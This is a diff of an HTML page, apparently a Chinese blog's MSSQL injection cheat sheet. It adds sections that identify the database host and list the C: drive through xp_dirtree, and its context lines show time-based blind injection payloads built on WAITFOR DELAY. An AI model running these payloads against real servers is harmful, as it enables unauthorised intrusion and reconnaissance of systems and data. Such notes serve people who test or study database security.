@@ -419,7 +419,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    672
+                    722
                 </div>
                 
 
@@ -445,7 +445,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p>
-<h2 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h2><h2 id="一、常见函数"><a href="#一、常见函数" class="headerlink" title="一、常见函数"></a>一、常见函数</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 注释符</span>
+<h2 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 注释符</span>
 <span class="token comment">--					</span>
 <span class="token comment">/**/</span>
 
@@ -564,6 +564,16 @@ and+1=(db_name/**/()%1e%1e)%1e%1e--
 <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:2'</span><span class="token comment">--+</span>
 
 <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:5'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4、判断是否为站库分析"><a href="#4、判断是否为站库分析" class="headerlink" title="4、判断是否为站库分析"></a>4、判断是否为站库分析</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 数据库所在主机名</span>
+<span class="token keyword">select</span> @<span class="token variable">@servername</span>
+
+<span class="token comment"># 当前服务器的主机名</span>
+<span class="token keyword">select</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5、查看c盘目录"><a href="#5、查看c盘目录" class="headerlink" title="5、查看c盘目录"></a>5、查看c盘目录</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> tmp<span class="token punctuation">(</span>dir ntext<span class="token punctuation">,</span> num <span class="token keyword">int</span><span class="token punctuation">)</span>
+<span class="token keyword">insert</span> tmp <span class="token keyword">execute</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">'c:/'</span><span class="token punctuation">,</span><span class="token number">1</span>
+<span class="token keyword">select</span> dir <span class="token keyword">from</span> tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -1246,7 +1256,7 @@ and+1=(db_name/**/()%1e%1e)%1e%1e--
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">20.3k</span>
+                        class="white-color">25.6k</span>
             
             
             
